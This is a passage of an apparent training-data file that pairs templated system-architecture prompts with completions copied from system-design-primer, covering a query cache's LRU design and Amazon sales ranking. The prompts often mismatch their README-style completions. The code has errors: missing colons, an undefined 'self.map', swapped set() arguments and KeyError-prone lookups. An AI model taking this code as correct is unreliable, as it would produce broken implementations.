self.reverse_index_service.process_search(query)\n            self.memory_cache.set(query, results)\n        return results\n```\n\n实现**节点**：\n\n```python\nclass Node(object):\n\n    def __init__(self, query, results):\n        self.query = query\n        self.results = results\n```\n\n实现**链表**：\n\n```python\nclass LinkedList(object):\n\n    def __init__(self):\n        self.head = None\n        self.tail = None\n\n    def move_to_front(self, node):\n        ...\n\n    def append_to_front(self, node):\n        ...\n\n    def remove_from_tail(self):\n        ...\n```\n\n实现**缓存**：\n\n```python\nclass Cache(object):\n\n    def __init__(self, MAX_SIZE):\n        self.MAX_SIZE = MAX_SIZE\n        self.size = 0\n        self.lookup = {}  # key: query, value: node\n        self.linked_list = LinkedList()\n\n    def get(self, query)\n        \"\"\"从缓存取得存储的内容\n\n        将入口节点位置更新为 LRU 链表的头部。\n        \"\"\"\n        node = self.lookup[query]\n        if node is None:\n            return None\n        self.linked_list.move_to_front(node)\n        return node.results\n\n    def set(self, results, query):\n        \"\"\"将所给查询键的结果存在缓存中。\n\n        当更新缓存记录的时候，将它的位置指向 LRU 链表的头部。\n        如果这个记录是新的记录，并且缓存空间已满，应该在加入新记录前\n        删除最老的记录。\n        \"\"\"\n        node = self.lookup[query]\n        if node is not None:\n            # 键存在于缓存中，更新它对应的值\n            node.results = results\n            self.linked_list.move_to_front(node)\n        else:\n            # 键不存在于缓存中\n            if self.size == self.MAX_SIZE:\n                # 在链表中查找并删除最老的记录\n                self.lookup.pop(self.linked_list.tail.query, None)\n                self.linked_list.remove_from_tail()\n            else:\n                self.size += 1\n            # 添加新的键值对\n            new_node = Node(query, results)\n            self.linked_list.append_to_front(new_node)\n            self.lookup[query] = new_node\n```\n\n#### 何时更新缓存\n\n缓存将会在以下几种情况更新：\n\n* 页面内容发生变化\n* 页面被移除或者加入了新页面\n* 页面的权值发生变动\n\n解决这些问题的最直接的方法，就是为缓存记录设置一个它在被更新前能留在缓存中的最长时间，这个时间简称为存活时间（TTL）。\n\n参考 [「何时更新缓存」](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#何时更新缓存)来了解其权衡取舍及替代方案。以上方法在[缓存模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#缓存模式)一章中详细地进行了描述。\n\n## 第四步：架构扩展\n\n> 根据限制条件，找到并解决瓶颈。\n\n![Imgur](http://i.imgur.com/4j99mhe.png)\n\n**重要提示：不要从最初设计直接跳到最终设计中！**\n\n现在你要 1) **基准测试、负载测试**。2) **分析、描述**性能瓶颈。3) 在解决瓶颈问题的同时，评估替代方案、权衡利弊。4) 重复以上步骤。请阅读[「设计一个系统，并将其扩大到为数以百万计的 AWS 用户服务」](../scaling_aws/README.md) 来了解如何逐步扩大初始设计。\n\n讨论初始设计可能遇到的瓶颈及相关解决方案是很重要的。例如加上一个配置多台 **Web 服务器**的**负载均衡器**是否能够解决问题？**CDN**呢？**主从复制**呢？它们各自的替代方案和需要**权衡**的利弊又有什么呢？\n\n我们将会介绍一些组件来完成设计，并解决架构扩张问题。内置的负载均衡器将不做讨论以节省篇幅。\n\n**为了避免重复讨论**，请参考[系统设计主题索引](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#系统设计主题的索引)相关部分来了解其要点、方案的权衡取舍以及可选的替代方案。\n\n* [DNS](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#域名系统)\n* [负载均衡器](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#负载均衡器)\n* [水平拓展](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#水平扩展)\n* [反向代理（web 服务器）](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#反向代理web-服务器)\n* [API 服务（应用层）](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#应用层)\n* [缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#缓存)\n* [一致性模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#一致性模式)\n* [可用性模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#可用性模式)\n\n### 将内存缓存扩大到多台机器\n\n为了解决庞大的请求负载以及巨大的内存需求，我们将要对架构进行水平拓展。如何在我们的**内存缓存**集群中存储数据呢？我们有以下三个主要可选方案：\n\n* **缓存集群中的每一台机器都有自己的缓存** - 简单，但是它会降低缓存命中率。\n* **缓存集群中的每一台机器都有缓存的拷贝** - 简单，但是它的内存使用效率太低了。\n* **对缓存进行[分片](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#分片)，分别部署在缓存集群中的所有机器中** - 更加复杂，但是它是最佳的选择。我们可以使用哈希，用查询语句 `machine = hash(query)` 来确定哪台机器有需要缓存。当然我们也可以使用[一致性哈希](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#正在完善中)。\n\n## 其它要点\n\n> 是否深入这些额外的主题，取决于你的问题范围和剩下的时间。\n\n### SQL 缩放模式\n\n* [读取复制](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#主从复制)\n* [联合](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#联合)\n* [分片](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#分片)\n* [非规范化](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#非规范化)\n* [SQL 调优](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#sql-调优)\n\n#### NoSQL\n\n* [键-值存储](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#键-值存储)\n* [文档类型存储](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#文档类型存储)\n* [列型存储](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#列型存储)\n* [图数据库](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#图数据库)\n* [SQL vs NoSQL](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#sql-还是-nosql)\n\n### 缓存\n\n* 在哪缓存\n    * [客户端缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#客户端缓存)\n    * [CDN 缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#cdn-缓存)\n    * [Web 服务器缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#web-服务器缓存)\n    * [数据库缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#数据库缓存)\n    * [应用缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#应用缓存)\n* 什么需要缓存\n    * [数据库查询级别的缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#数据库查询级别的缓存)\n    * [对象级别的缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#对象级别的缓存)\n* 何时更新缓存\n    * [缓存模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#缓存模式)\n    * [直写模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#直写模式)\n    * [回写模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#回写模式)\n    * [刷新](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#刷新)\n\n### 异步与微服务\n\n* [消息队列](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#消息队列)\n* [任务队列](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#任务队列)\n* [背压](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#背压)\n* [微服务](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#微服务)\n\n### 通信\n\n* 可权衡选择的方案：\n    * 与客户端的外部通信 - [使用 REST 作为 HTTP API](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#表述性状态转移rest)\n    * 服务器内部通信 - [RPC](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#远程过程调用协议rpc)\n* [服务发现](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#服务发现)\n\n### 安全性\n\n请参阅[「安全」](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#安全)一章。\n\n### 延迟数值\n\n请参阅[「每个程序员都应该知道的延迟数」](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#每个程序员都应该知道的延迟数)。\n\n### 持续探讨\n\n* 持续进行基准测试并监控你的系统，以解决他们提出的瓶颈问题。\n* 架构拓展是一个迭代的过程。\n", "metadata": {"source": "github.com/donnemartin/system-design-primer", "file_path": "solutions/system_design/query_cache/README-zh-Hans.md", "language": "markdown", "complexity": "complex", "star_count": 312958, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": true, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 307}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Design a key-value cache to save the results of the most recent web server queries\n\n*Note: This document links directly to relevant areas found in the [system design topics](https://github.com/donnemartin/system-design-primer#index-of-system-design-topics) to avoid duplication.  Refer to the linked content for general talking points, tradeoffs, and alternatives.*\n\n## Step 1: Outline use cases and constraints\n\n> Gather requirements and scope the problem.\n> Ask questions to clarify use cases and constraints.\n> Discuss assumptions.\n\nWithout an interviewer to address clarifying questions, we'll define some use cases and constraints.\n\n### Use cases\n\n#### We'll scope the problem to handle only the following use cases\n\n* **User** sends a search request resulting in a cache hit\n* **User** sends a search request resulting in a cache miss\n* **Service** has high availability\n\n### Constraints and assumptions\n\n#### State assumptions\n\n* Traffic is not evenly distributed\n    * Popular queries should almost always be in the cache\n    * Need to determine how to expire/refresh\n* Serving from cache requires fast lookups\n* Low latency between machines\n* Limited memory in cache\n    * Need to determine what to keep/remove\n    * Need to cache millions of queries\n* 10 million users\n* 10 billion queries per month\n\n#### Calculate usage\n\n**Clarify with your interviewer if you should run back-of-the-envelope usage calculations.**\n\n* Cache stores ordered list of key: query, value: results\n    * `query` - 50 bytes\n    * `title` - 20 bytes\n    * `snippet` - 200 bytes\n    * Total: 270 bytes\n* 2.7 TB of cache data per month if all 10 billion queries are unique and all are stored\n    * 270 bytes per search * 10 billion searches per month\n    * Assumptions state limited memory, need to determine how to expire contents\n* 4,000 requests per second\n\nHandy conversion guide:\n\n* 2.5 million seconds per month\n* 1 request per second = 2.5 million requests per month\n* 40 requests per second = 100 million requests per month\n* 400 requests per second = 1 billion requests per month\n\n## Step 2: Create a high level design\n\n> Outline a high level design with all important components.\n\n![Imgur](http://i.imgur.com/KqZ3dSx.png)\n\n## Step 3: Design core components\n\n> Dive into details for each core component.\n\n### Use case: User sends a request resulting in a cache hit\n\nPopular queries can be served from a **Memory Cache** such as Redis or Memcached to reduce read latency and to avoid overloading the **Reverse Index Service** and **Document Service**.  Reading 1 MB sequentially from memory takes about 250 microseconds, while reading from SSD takes 4x and from disk takes 80x longer.<sup><a href=https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know>1</a></sup>\n\nSince the cache has limited capacity, we'll use a least recently used (LRU) approach to expire older entries.\n\n* The **Client** sends a request to the **Web Server**, running as a [reverse proxy](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)\n* The **Web Server** forwards the request to the **Query API** server\n* The **Query API** server does the following:\n    * Parses the query\n        * Removes markup\n        * Breaks up the text into terms\n        * Fixes typos\n        * Normalizes capitalization\n        * Converts the query to use boolean operations\n    * Checks the **Memory Cache** for the content matching the query\n        * If there's a hit in the **Memory Cache**, the **Memory Cache** does the following:\n            * Updates the cached entry's position to the front of the LRU list\n            * Returns the cached contents\n        * Else, the **Query API** does the following:\n            * Uses the **Reverse Index Service** to find documents matching the query\n                * The **Reverse Index Service** ranks the matching results and returns the top ones\n            * Uses the **Document Service** to return titles and snippets\n            * Updates the **Memory Cache** with the contents, placing the entry at the front of the LRU list\n\n#### Cache implementation\n\nThe cache can use a doubly-linked list: new items will be added to the head while items to expire will be removed from the tail.  We'll use a hash table for fast lookups to each linked list node.\n\n**Clarify with your interviewer how much code you are expected to write**.\n\n**Query API Server** implementation:\n\n```python\nclass QueryApi(object):\n\n    def __init__(self, memory_cache, reverse_index_service):\n        self.memory_cache = memory_cache\n        self.reverse_index_service = reverse_index_service\n\n    def parse_query(self, query):\n        \"\"\"Remove markup, break text into terms, deal with typos,\n        normalize capitalization, convert to use boolean operations.\n        \"\"\"\n        ...\n\n    def process_query(self, query):\n        query = self.parse_query(query)\n        results = self.memory_cache.get(query)\n        if results is None:\n            results = self.reverse_index_service.process_search(query)\n            self.memory_cache.set(query, results)\n        return results\n```\n\n**Node** implementation:\n\n```python\nclass Node(object):\n\n    def __init__(self, query, results):\n        self.query = query\n        self.results = results\n```\n\n**LinkedList** implementation:\n\n```python\nclass LinkedList(object):\n\n    def __init__(self):\n        self.head = None\n        self.tail = None\n\n    def move_to_front(self, node):\n        ...\n\n    def append_to_front(self, node):\n        ...\n\n    def remove_from_tail(self):\n        ...\n```\n\n**Cache** implementation:\n\n```python\nclass Cache(object):\n\n    def __init__(self, MAX_SIZE):\n        self.MAX_SIZE = MAX_SIZE\n        self.size = 0\n        self.lookup = {}  # key: query, value: node\n        self.linked_list = LinkedList()\n\n    def get(self, query)\n        \"\"\"Get the stored query result from the cache.\n\n        Accessing a node updates its position to the front of the LRU list.\n        \"\"\"\n        node = self.lookup[query]\n        if node is None:\n            return None\n        self.linked_list.move_to_front(node)\n        return node.results\n\n    def set(self, results, query):\n        \"\"\"Set the result for the given query key in the cache.\n\n        When updating an entry, updates its position to the front of the LRU list.\n        If the entry is new and the cache is at capacity, removes the oldest entry\n        before the new entry is added.\n        \"\"\"\n        node = self.lookup[query]\n        if node is not None:\n            # Key exists in cache, update the value\n            node.results = results\n            self.linked_list.move_to_front(node)\n        else:\n            # Key does not exist in cache\n            if self.size == self.MAX_SIZE:\n                # Remove the oldest entry from the linked list and lookup\n                self.lookup.pop(self.linked_list.tail.query, None)\n                self.linked_list.remove_from_tail()\n            else:\n                self.size += 1\n            # Add the new key and value\n            new_node = Node(query, results)\n            self.linked_list.append_to_front(new_node)\n            self.lookup[query] = new_node\n```\n\n#### When to update the cache\n\nThe cache should be updated when:\n\n* The page contents change\n* The page is removed or a new page is added\n* The page rank changes\n\nThe most straightforward way to handle these cases is to simply set a max time that a cached entry can stay in the cache before it is updated, usually referred to as time to live (TTL).\n\nRefer to [When to update the cache](https://github.com/donnemartin/system-design-primer#when-to-update-the-cache) for tradeoffs and alternatives.  The approach above describes [cache-aside](https://github.com/donnemartin/system-design-primer#cache-aside).\n\n## Step 4: Scale the design\n\n> Identify and address bottlenecks, given the constraints.\n\n![Imgur](http://i.imgur.com/4j99mhe.png)\n\n**Important: Do not simply jump right into the final design from the initial design!**\n\nState you would 1) **Benchmark/Load Test**, 2) **Profile** for bottlenecks 3) address bottlenecks while evaluating alternatives and trade-offs, and 4) repeat.  See [Design a system that scales to millions of users on AWS](../scaling_aws/README.md) as a sample on how to iteratively scale the initial design.\n\nIt's important to discuss what bottlenecks you might encounter with the initial design and how you might address each of them.  For example, what issues are addressed by adding a **Load Balancer** with multiple **Web Servers**?  **CDN**?  **Master-Slave Replicas**?  What are the alternatives and **Trade-Offs** for each?\n\nWe'll introduce some components to complete the design and to address scalability issues.  Internal load balancers are not shown to reduce clutter.\n\n*To avoid repeating discussions*, refer to the following [system design topics](https://github.com/donnemartin/system-design-primer#index-of-system-design-topics) for main talking points, tradeoffs, and alternatives:\n\n* [DNS](https://github.com/donnemartin/system-design-primer#domain-name-system)\n* [Load balancer](https://github.com/donnemartin/system-design-primer#load-balancer)\n* [Horizontal scaling](https://github.com/donnemartin/system-design-primer#horizontal-scaling)\n* [Web server (reverse proxy)](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)\n* [API server (application layer)](https://github.com/donnemartin/system-design-primer#application-layer)\n* [Cache](https://github.com/donnemartin/system-design-primer#cache)\n* [Consistency patterns](https://github.com/donnemartin/system-design-primer#consistency-patterns)\n* [Availability patterns](https://github.com/donnemartin/system-design-primer#availability-patterns)\n\n### Expanding the Memory Cache to many machines\n\nTo handle the heavy request load and the large amount of memory needed, we'll scale horizontally.  We have three main options on how to store the data on our **Memory Cache** cluster:\n\n* **Each machine in the cache cluster has its own cache** - Simple, although it will likely result in a low cache hit rate.\n* **Each machine in the cache cluster has a copy of the cache** - Simple, although it is an inefficient use of memory.\n* **The cache is [sharded](https://github.com/donnemartin/system-design-primer#sharding) across all machines in the cache cluster** - More complex, although it is likely the best option.  We could use hashing to determine which machine could have the cached results of a query using `machine = hash(query)`.  We'll likely want to use [consistent hashing](https://github.com/donnemartin/system-design-primer#under-development).\n\n## Additional talking points\n\n> Additional topics to dive into, depending on the problem scope and time remaining.\n\n### SQL scaling patterns\n\n* [Read replicas](https://github.com/donnemartin/system-design-primer#master-slave-replication)\n* [Federation](https://github.com/donnemartin/system-design-primer#federation)\n* [Sharding](https://github.com/donnemartin/system-design-primer#sharding)\n* [Denormalization](https://github.com/donnemartin/system-design-primer#denormalization)\n* [SQL Tuning](https://github.com/donnemartin/system-design-primer#sql-tuning)\n\n#### NoSQL\n\n* [Key-value store](https://github.com/donnemartin/system-design-primer#key-value-store)\n* [Document store](https://github.com/donnemartin/system-design-primer#document-store)\n* [Wide column store](https://github.com/donnemartin/system-design-primer#wide-column-store)\n* [Graph database](https://github.com/donnemartin/system-design-primer#graph-database)\n* [SQL vs NoSQL](https://github.com/donnemartin/system-design-primer#sql-or-nosql)\n\n### Caching\n\n* Where to cache\n    * [Client caching](https://github.com/donnemartin/system-design-primer#client-caching)\n    * [CDN caching](https://github.com/donnemartin/system-design-primer#cdn-caching)\n    * [Web server caching](https://github.com/donnemartin/system-design-primer#web-server-caching)\n    * [Database caching](https://github.com/donnemartin/system-design-primer#database-caching)\n    * [Application caching](https://github.com/donnemartin/system-design-primer#application-caching)\n* What to cache\n    * [Caching at the database query level](https://github.com/donnemartin/system-design-primer#caching-at-the-database-query-level)\n    * [Caching at the object level](https://github.com/donnemartin/system-design-primer#caching-at-the-object-level)\n* When to update the cache\n    * [Cache-aside](https://github.com/donnemartin/system-design-primer#cache-aside)\n    * [Write-through](https://github.com/donnemartin/system-design-primer#write-through)\n    * [Write-behind (write-back)](https://github.com/donnemartin/system-design-primer#write-behind-write-back)\n    * [Refresh ahead](https://github.com/donnemartin/system-design-primer#refresh-ahead)\n\n### Asynchronism and microservices\n\n* [Message queues](https://github.com/donnemartin/system-design-primer#message-queues)\n* [Task queues](https://github.com/donnemartin/system-design-primer#task-queues)\n* [Back pressure](https://github.com/donnemartin/system-design-primer#back-pressure)\n* [Microservices](https://github.com/donnemartin/system-design-primer#microservices)\n\n### Communications\n\n* Discuss tradeoffs:\n    * External communication with clients - [HTTP APIs following REST](https://github.com/donnemartin/system-design-primer#representational-state-transfer-rest)\n    * Internal communications - [RPC](https://github.com/donnemartin/system-design-primer#remote-procedure-call-rpc)\n* [Service discovery](https://github.com/donnemartin/system-design-primer#service-discovery)\n\n### Security\n\nRefer to the [security section](https://github.com/donnemartin/system-design-primer#security).\n\n### Latency numbers\n\nSee [Latency numbers every programmer should know](https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know).\n\n### Ongoing\n\n* Continue benchmarking and monitoring your system to address bottlenecks as they come up\n* Scaling is an iterative process\n", "metadata": {"source": "github.com/donnemartin/system-design-primer", "file_path": "solutions/system_design/query_cache/README.md", "language": "markdown", "complexity": "complex", "star_count": 312958, "quality_score": 0.92, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": true, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 307}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# -*- coding: utf-8 -*-\n\n\nclass QueryApi(object):\n\n    def __init__(self, memory_cache, reverse_index_cluster):\n        self.memory_cache = memory_cache\n        self.reverse_index_cluster = reverse_index_cluster\n\n    def parse_query(self, query):\n        \"\"\"Remove markup, break text into terms, deal with typos,\n        normalize capitalization, convert to use boolean operations.\n        \"\"\"\n        ...\n\n    def process_query(self, query):\n        query = self.parse_query(query)\n        results = self.memory_cache.get(query)\n        if results is None:\n            results = self.reverse_index_cluster.process_search(query)\n            self.memory_cache.set(query, results)\n        return results\n\n\nclass Node(object):\n\n    def __init__(self, query, results):\n        self.query = query\n        self.results = results\n\n\nclass LinkedList(object):\n\n    def __init__(self):\n        self.head = None\n        self.tail = None\n\n    def move_to_front(self, node):\n        ...\n\n    def append_to_front(self, node):\n        ...\n\n    def remove_from_tail(self):\n        ...\n\n\nclass Cache(object):\n\n    def __init__(self, MAX_SIZE):\n        self.MAX_SIZE = MAX_SIZE\n        self.size = 0\n        self.lookup = {}\n        self.linked_list = LinkedList()\n\n    def get(self, query):\n        \"\"\"Get the stored query result from the cache.\n\n        Accessing a node updates its position to the front of the LRU list.\n        \"\"\"\n        node = self.lookup[query]\n        if node is None:\n            return None\n        self.linked_list.move_to_front(node)\n        return node.results\n\n    def set(self, results, query):\n        \"\"\"Set the result for the given query key in the cache.\n\n        When updating an entry, updates its position to the front of the LRU list.\n        If the entry is new and the cache is at capacity, removes the oldest entry\n        before the new entry is added.\n        \"\"\"\n        node = self.map[query]\n        if node is not None:\n            # Key exists in cache, update the value\n            node.results = results\n            self.linked_list.move_to_front(node)\n        else:\n            # Key does not exist in cache\n            if self.size == self.MAX_SIZE:\n                # Remove the oldest entry from the linked list and lookup\n                self.lookup.pop(self.linked_list.tail.query, None)\n                self.linked_list.remove_from_tail()\n            else:\n                self.size += 1\n            # Add the new key and value\n            new_node = Node(query, results)\n            self.linked_list.append_to_front(new_node)\n            self.lookup[query] = new_node\n", "metadata": {"source": "github.com/donnemartin/system-design-primer", "file_path": "solutions/system_design/query_cache/query_cache_snippets.py", "language": "python", "complexity": "simple", "star_count": 312958, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 91}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Design Amazon's sales rank by category feature\n\n*Note: This document links directly to relevant areas found in the [system design topics](https://github.com/donnemartin/system-design-primer#index-of-system-design-topics) to avoid duplication.  Refer to the linked content for general talking points, tradeoffs, and alternatives.*\n\n## Step 1: Outline use cases and constraints\n\n> Gather requirements and scope the problem.\n> Ask questions to clarify use cases and constraints.\n> Discuss assumptions.\n\nWithout an interviewer to address clarifying questions, we'll define some use cases and constraints.\n\n### Use cases\n\n#### We'll scope the problem to handle only the following use case\n\n* **Service** calculates the past week's most popular products by category\n* **User** views the past week's most popular products by category\n* **Service** has high availability\n\n#### Out of scope\n\n* The general e-commerce site\n    * Design components only for calculating sales rank\n\n### Constraints and assumptions\n\n#### State assumptions\n\n* Traffic is not evenly distributed\n* Items can be in multiple categories\n* Items cannot change categories\n* There are no subcategories ie `foo/bar/baz`\n* Results must be updated hourly\n    * More popular products might need to be updated more frequently\n* 10 million products\n* 1000 categories\n* 1 billion transactions per month\n* 100 billion read requests per month\n* 100:1 read to write ratio\n\n#### Calculate usage\n\n**Clarify with your interviewer if you should run back-of-the-envelope usage calculations.**\n\n* Size per transaction:\n    * `created_at` - 5 bytes\n    * `product_id` - 8 bytes\n    * `category_id` - 4 bytes\n    * `seller_id` - 8 bytes\n    * `buyer_id` - 8 bytes\n    * `quantity` - 4 bytes\n    * `total_price` - 5 bytes\n    * Total: ~40 bytes\n* 40 GB of new transaction content per month\n    * 40 bytes per transaction * 1 billion transactions per month\n    * 1.44 TB of new transaction content in 3 years\n    * Assume most are new transactions instead of updates to existing ones\n* 400 transactions per second on average\n* 40,000 read requests per second on average\n\nHandy conversion guide:\n\n* 2.5 million seconds per month\n* 1 request per second = 2.5 million requests per month\n* 40 requests per second = 100 million requests per month\n* 400 requests per second = 1 billion requests per month\n\n## Step 2: Create a high level design\n\n> Outline a high level design with all important components.\n\n![Imgur](http://i.imgur.com/vwMa1Qu.png)\n\n## Step 3: Design core components\n\n> Dive into details for each core component.\n\n### Use case: Service calculates the past week's most popular products by category\n\nWe could store the raw **Sales API** server log files on a managed **Object Store** such as Amazon S3, rather than managing our own distributed file system.\n\n**Clarify with your interviewer how much code you are expected to write**.\n\nWe'll assume this is a sample log entry, tab delimited:\n\n```\ntimestamp   product_id  category_id    qty     total_price   seller_id    buyer_id\nt1          product1    category1      2       20.00         1            1\nt2          product1    category2      2       20.00         2            2\nt2          product1    category2      1       10.00         2            3\nt3          product2    category1      3        7.00         3            4\nt4          product3    category2      7        2.00         4            5\nt5          product4    category1      1        5.00         5            6\n...\n```\n\nThe **Sales Rank Service** could use **MapReduce**, using the **Sales API** server log files as input and writing the results to an aggregate table `sales_rank` in a **SQL Database**.  We should discuss the [use cases and tradeoffs between choosing SQL or NoSQL](https://github.com/donnemartin/system-design-primer#sql-or-nosql).\n\nWe'll use a multi-step **MapReduce**:\n\n* **Step 1** - Transform the data to `(category, product_id), sum(quantity)`\n* **Step 2** - Perform a distributed sort\n\n```python\nclass SalesRanker(MRJob):\n\n    def within_past_week(self, timestamp):\n        \"\"\"Return True if timestamp is within past week, False otherwise.\"\"\"\n        ...\n\n    def mapper(self, _ line):\n        \"\"\"Parse each log line, extract and transform relevant lines.\n\n        Emit key value pairs of the form:\n\n        (category1, product1), 2\n        (category2, product1), 2\n        (category2, product1), 1\n        (category1, product2), 3\n        (category2, product3), 7\n        (category1, product4), 1\n        \"\"\"\n        timestamp, product_id, category_id, quantity, total_price, seller_id, \\\n            buyer_id = line.split('\\t')\n        if self.within_past_week(timestamp):\n            yield (category_id, product_id), quantity\n\n    def reducer(self, key, value):\n        \"\"\"Sum values for each key.\n\n        (category1, product1), 2\n        (category2, product1), 3\n        (category1, product2), 3\n        (category2, product3), 7\n        (category1, product4), 1\n        \"\"\"\n        yield key, sum(values)\n\n    def mapper_sort(self, key, value):\n        \"\"\"Construct key to ensure proper sorting.\n\n        Transform key and value to the form:\n\n        (category1, 2), product1\n        (category2, 3), product1\n        (category1, 3), product2\n        (category2, 7), product3\n        (category1, 1), product4\n\n        The shuffle/sort step of MapReduce will then do a\n        distributed sort on the keys, resulting in:\n\n        (category1, 1), product4\n        (category1, 2), product1\n        (category1, 3), product2\n        (category2, 3), product1\n        (category2, 7), product3\n        \"\"\"\n        category_id, product_id = key\n        quantity = value\n        yield (category_id, quantity), product_id\n\n    def reducer_identity(self, key, value):\n        yield key, value\n\n    def steps(self):\n        \"\"\"Run the map and reduce steps.\"\"\"\n        return [\n            self.mr(mapper=self.mapper,\n                    reducer=self.reducer),\n            self.mr(mapper=self.mapper_sort,\n                    reducer=self.reducer_identity),\n        ]\n```\n\nThe result would be the following sorted list, which we could insert into the `sales_rank` table:\n\n```\n(category1, 1), product4\n(category1, 2), product1\n(category1, 3), product2\n(category2, 3), product1\n(category2, 7), product3\n```\n\nThe `sales_rank` table could have the following structure:\n\n```\nid int NOT NULL AUTO_INCREMENT\ncategory_id int NOT NULL\ntotal_sold int NOT NULL\nproduct_id int NOT NULL\nPRIMARY KEY(id)\nFOREIGN KEY(category_id) REFERENCES Categories(id)\nFOREIGN KEY(product_id) REFERENCES Products(id)\n```\n\nWe'll create an [index](https://github.com/donnemartin/system-design-primer#use-good-indices) on `id `, `category_id`, and `product_id` to speed up lookups (log-time instead of scanning the entire table) and to keep the data in memory.  Reading 1 MB sequentially from memory takes about 250 microseconds, while reading from SSD takes 4x and from disk takes 80x longer.<sup><a href=https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know>1</a></sup>\n\n### Use case: User views the past week's most popular products by category\n\n* The **Client** sends a request to the **Web Server**, running as a [reverse proxy](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)\n* The **Web Server** forwards the request to the **Read API** server\n* The **Read API** server reads from the **SQL Database** `sales_rank` table\n\nWe'll use a public [**REST API**](https://github.com/donnemartin/system-design-primer#representational-state-transfer-rest):\n\n```\n$ curl https://amazon.com/api/v1/popular?category_id=1234\n```\n\nResponse:\n\n```\n{\n    \"id\": \"100\",\n    \"category_id\": \"1234\",\n    \"total_sold\": \"100000\",\n    \"product_id\": \"50\",\n},\n{\n    \"id\": \"53\",\n    \"category_id\": \"1234\",\n    \"total_sold\": \"90000\",\n    \"product_id\": \"200\",\n},\n{\n    \"id\": \"75\",\n    \"category_id\": \"1234\",\n    \"total_sold\": \"80000\",\n    \"product_id\": \"3\",\n},\n```\n\nFor internal communications, we could use [Remote Procedure Calls](https://github.com/donnemartin/system-design-primer#remote-procedure-call-rpc).\n\n## Step 4: Scale the 